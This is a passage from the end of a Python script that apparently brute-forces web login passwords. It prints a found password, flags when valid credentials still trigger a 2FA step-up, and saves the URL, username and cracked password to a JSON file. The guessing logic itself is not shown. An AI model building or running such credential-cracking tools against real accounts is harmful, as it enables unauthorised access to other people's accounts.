            print(f"  {C.YELLOW}{'Note':<20}{C.RESET} 2FA challenge issued — credentials valid but step-up required")
        if found.reason:
            print(f"  {C.DIM}{'Detection':<20}{C.RESET} {found.reason}")
        if cfg.output:
            Path(cfg.output).write_text(json.dumps({
                "url": cfg.url,
                "username": cfg.username,
                "password": found.password,
                "needs_2fa": found.needs_2fa,
                "reason": found.reason,
                "found_at": time.time(),
            }, indent=2))
            ok(f"Wrote credentials to {cfg.output}")
        return 0
    else:
        warn("Password not found.")
        return 1


def main() -> int:
    while True:
        try:
            return asyncio.run(amain())
        except KeyboardInterrupt:
            warn("Interrupted.")
            return 130


if __name__ == "__main__":
    sys.exit(main())
